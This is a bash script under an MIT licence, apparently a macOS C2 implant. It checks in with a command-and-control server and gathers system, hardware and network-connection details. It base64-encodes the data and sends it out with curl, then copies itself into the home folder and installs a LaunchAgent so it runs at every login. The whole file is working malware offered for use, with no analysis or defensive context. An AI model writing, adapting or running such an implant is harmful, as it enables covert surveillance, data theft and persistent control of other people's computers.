########################################################################################################################################################################################################################
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#########################################################################################################################################################################################################################
#!/bin/bash

#!/bin/bash

C2Server="http://10.0.2.4:8000"  # Replace with the IP address and port of your C2 server
AgentID=""

encrypt_data() {
    local data="$1"
    echo "$data" | base64
}

decrypt_data() {
    local data="$1"
    echo "$data" | base64 --decode
}

write_log() {
    local message="$1"
    echo "$message"
}

send_data() {
    local endpoint="$1"
    local data="$2"
    local encrypted_data
    encrypted_data=$(encrypt_data "$data")
    curl -k -X POST "$C2Server/$endpoint" -d "$encrypted_data" -H "Content-Type: application/json"
}

check_in() {
    response=$(curl -s -X POST "$C2Server/checkin" -d '{"AgentID":""}' -H "Content-Type: application/json")
    AgentID=$(echo $response | jq -r '.AgentID')
    write_log "Checked in with AgentID: $AgentID"
}

gather_system_info() {
    uname -a > /tmp/sysinfo.txt
    sw_vers >> /tmp/sysinfo.txt
    system_profiler SPHardwareDataType >> /tmp/sysinfo.txt
    cat /tmp/sysinfo.txt
}

list_network_connections() {
    netstat -an > /tmp/netstat.txt
    cat /tmp/netstat.txt
}

establish_persistence() {
    local plist_path="$HOME/Library/LaunchAgents/com.macos.payload.plist"
    cat <<EOF > $plist_path
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.macos.payload</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>$HOME/macos_payload.sh</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF
    cp "$0" "$HOME/macos_payload.sh"
    launchctl load -w $plist_path
}

main() {
    write_log "Payload started."
    
    check_in
    system_info=$(gather_system_info)
    network_connections=$(list_network_connections)
    
    data=$(cat <<EOF
{
    "AgentID": "$AgentID",
    "SystemInfo": "$system_info",
    "NetworkConnections": "$network_connections"
}
EOF
)
    
    send_data "report" "$data"
    establish_persistence
}

main

